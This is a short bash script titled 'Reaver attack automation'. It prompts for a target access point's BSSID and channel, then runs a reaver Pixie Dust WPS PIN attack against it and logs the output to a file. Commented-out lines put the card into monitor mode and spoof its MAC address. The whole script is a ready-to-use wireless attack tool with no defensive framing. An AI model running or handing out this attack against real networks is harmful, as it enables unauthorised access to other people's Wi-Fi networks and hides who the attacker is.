#!/bin/bash

##################################### Reaver attack automation ##################################

#read -ep "Wlan1 MAC: " MAC

read -ep "Target BSSID: " TGT

read -ep "Target Channel: " CHAN

read -ep "Output File Name: " TXT

#sudo airmon-ng check kill
#sleep .1
#sudo airmon-ng start wlan1
#sleep .1
#sudo ifconfig wlan1mon down 
#sleep .1
#sudo macchanger -m $MAC wlan1mon
#sleep .1
#sudo ifconfig wlan1mon up
#sleep .1
sudo reaver -i wlan1mon -b $TGT -c $CHAN -K -S -vvv | tee /home/user/Desktop/Collection/ReaverDump/$TXT.txt
